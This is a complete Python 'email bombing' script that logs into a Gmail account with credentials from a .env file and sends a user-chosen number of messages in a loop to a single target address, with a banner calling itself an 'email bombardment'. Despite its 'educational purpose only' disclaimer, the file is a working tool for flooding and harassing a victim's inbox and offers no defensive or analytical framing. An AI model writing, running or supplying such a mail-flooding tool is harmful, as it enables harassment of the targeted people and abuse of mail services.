#Thank You for using this code.

#Any changes made to this code is not the responsibility of the Author.

#This Code is for Educational Purpose Only, The author is not responsible for any misuse of this code,or for any loss or damage caused by this code.

#This code is not meant for "UNETHICAL HACKING", In any case of misuse, the user is solely responsible.

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import time
import random
from dotenv import load_dotenv
import pyfiglet  

load_dotenv("EMAIL_PASS.env")

def banner():
    print("\033[1;32m") 
    print("=" * 50)
    print("          🚀 EMAIL SENDER SCRIPT 🚀")
    print("=" * 50)
    print("Author: 'Defcon Scripters' | Mode: 'The Email Bombing'")
    print("=" * 50)
    print("\033[0m")  

def show_warning():
    warning_text = "THE EMAIL BOMBING"
    ascii_warning = pyfiglet.figlet_format(warning_text, font="slant")
    print("\033[1;37m" + ascii_warning + "\033[0m")  
    print("\033[1;37mPlease Remember that this is only for educational purpose, not for unethical hacking!\033[0m")  

def send_email(to_email, subject, body):
    from_email = os.getenv("EMAIL_USER")
    from_password = os.getenv("EMAIL_PASS")
    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    if not from_email or not from_password:
        print("\033[1;31m[ERROR] Missing EMAIL_USER or EMAIL_PASS in EMAIL_PASS.env file.\033[0m")
        return False

    message = MIMEMultipart()
    message["From"] = from_email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(from_email, from_password)
            server.sendmail(from_email, to_email, message.as_string())
            print(f"\033[1;32m[SUCCESS] Email successfully sent to {to_email}\033[0m")
            return True
    except smtplib.SMTPAuthenticationError as e:
        print("\033[1;31m[ERROR] Authentication failed. Check your App Password or security settings.\033[0m")
        print(f"\033[1;31m[DETAILS] {e}\033[0m")
    except Exception as e:
        print("\033[1;31m[ERROR] An error occurred while sending the email.\033[0m")
        print(f"\033[1;31m[DETAILS] {e}\033[0m")
    return False

def send_multiple_emails(to_email, num_emails):
    sent_count = 0
    print("\033[1;36m[INFO] Starting email bombardment...\033[0m")
    for i in range(num_emails):
        subject = f"Message {i + 1}"
        body = f"This is email number {i + 1} sent to {to_email}."
        if send_email(to_email, subject, body):
            sent_count += 1
        else:
            print(f"\033[1;33m[STOP] Stopping after {sent_count} emails due to an error.\033[0m")
            break
        
        time.sleep(0.5)
    print(f"\033[1;32m[INFO] Total emails sent: {sent_count}\033[0m")

if __name__ == "__main__":
    show_warning()  
    banner()
    print("\033[1;34mWelcome to the Ultimate Email Sender!\033[0m")
    to_email = input("\033[1;36mEnter recipient email address: \033[0m")
    try:
        num_emails = int(input("\033[1;36mEnter the number of emails to send: \033[0m"))
        if num_emails <= 0:
            print("\033[1;31m[ERROR] The number of emails must be a positive integer.\033[0m")
        else:
            send_multiple_emails(to_email, num_emails)
    except ValueError:
        print("\033[1;31m[ERROR] Please enter a valid number.\033[0m")
